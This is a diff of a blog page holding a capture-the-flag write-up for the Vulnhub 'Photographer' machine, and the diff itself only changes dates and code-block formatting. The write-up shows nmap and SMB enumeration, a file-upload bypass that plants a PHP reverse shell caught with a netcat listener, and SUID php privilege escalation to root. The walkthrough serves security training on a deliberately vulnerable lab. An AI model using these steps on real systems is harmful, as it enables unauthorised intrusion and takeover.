@@ -48,8 +48,8 @@
     <meta property="og:image" content="/assets/images/photographer.png" />
     <meta property="article:publisher" content="https://www.facebook.com/" />
     <meta property="article:author" content="https://www.facebook.com/" />
-    <meta property="article:published_time" content="2020-09-04T00:00:00+00:00" />
-    <meta property="article:modified_time" content="2020-09-04T00:00:00+00:00" />
+    <meta property="article:published_time" content="2020-09-05T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-09-05T00:00:00+00:00" />
     <meta property="article:tag" content="Vulnhub" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Photographer Write Up" />
@@ -210,7 +210,7 @@ into the {body} of the default.hbs template -->
 
             <header class="post-full-header">
                 <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime=" 4 September 2020"> 4 September 2020</time>
+                    <time class="post-full-meta-date" datetime=" 5 September 2020"> 5 September 2020</time>
                     
                         <span class="date-divider">/</span>
                         
@@ -243,7 +243,7 @@ into the {body} of the default.hbs template -->
 
 <p>Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
 Nmap scan report for 192.168.1.77
@@ -287,7 +287,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
-</code></pre></div></div>
+</code></pre>
 
 <p>The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.</p>
 
@@ -306,9 +306,8 @@ Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
 <p><img src="/assets/images/photographer/login.png" alt="Login" /></p>
 
 <p>Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.</p>
-<pre>
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $smbclient -L \\\\192.168.1.77\\
 
         Sharename       Type      Comment
@@ -334,12 +333,11 @@ getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (av
 Get file wordpress.bkp.zip? y
 getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
 smb: \&gt; 
-```
-</pre>
+</code></pre>
+
 <p>Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.</p>
-<pre>
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cat mailsent.txt 
 Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
 Date: Mon, 20 Jul 2020 11:40:36 -0400
@@ -357,8 +355,8 @@ Your site is ready now.
 Don\'t forget your secret, my babygirl ;)
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $
-```
-</pre>
+</code></pre>
+
 <p>‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:</p>
 
 <ul>
@@ -374,29 +372,24 @@ Don\'t forget your secret, my babygirl ;)
 
 <p>Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a>.</p>
 
-<pre>
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $mv php-reverse-shell.php shell.php.jpg
-```
-</pre>
+</code></pre>
+
 <p>I update the script with my local IP and port details.</p>
-<pre>
-```
-$ip = '127.0.0.1';  // CHANGE THIS
+
+<pre><code class="language-highlight">$ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
-```
-</pre>
+</code></pre>
+
 <p>Start a netcat listener ready to catch the shell.</p>
-<pre>
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $sudo nc -nvlp 443
 listening on [any] 443 ...
-```
-</pre>
+</code></pre>
 
 <p>Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.</p>
 
@@ -415,17 +408,15 @@ listening on [any] 443 ...
 <p><img src="/assets/images/photographer/shell.png" alt="Shell" /></p>
 
 <p>The first flag can be found in Daisa’s user directory.</p>
-<pre>
-```
-www-data@photographer:/$ cd home/daisa/
+
+<pre><code class="language-highlight">www-data@photographer:/$ cd home/daisa/
 www-data@photographer:/home/daisa$ ls
 Desktop    Downloads  Pictures  Templates  examples.desktop
 Documents  Music      Public    Videos     user.txt
 www-data@photographer:/home/daisa$ cat user.txt 
 d41d8cd98f00{REDACTED}
 www-data@photographer:/home/daisa$
-```
-</pre>
+</code></pre>
 
 <h3 id="privilege-escalation">Privilege Escalation</h3>
 
@@ -446,24 +437,19 @@ www-data@photographer:/home/daisa$
 <p><img src="/assets/images/photographer/phpsuid.png" alt="gtfobins" /></p>
 
 <p>Lets give it a go.</p>
-<pre>
 
-```
-www-data@photographer:/tmp$ CMD="/bin/sh"
+<pre><code class="language-highlight">www-data@photographer:/tmp$ CMD="/bin/sh"
 www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
 # id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 # whoami
 root
 #
-```
-</pre>
+</code></pre>
 
 <p>We have root! Lets grab the flag.</p>
 
-<pre>
-```
-# 
+<pre><code class="language-highlight"># 
 # cd /root
 # cat proof.txt
                                                                 
@@ -497,8 +483,7 @@ Follow me at: http://v1n1v131r4.com
 
 d41d8cd98f00{REDACTED}
 #
-```
-</pre>
+</code></pre>
 
 
                 </div>
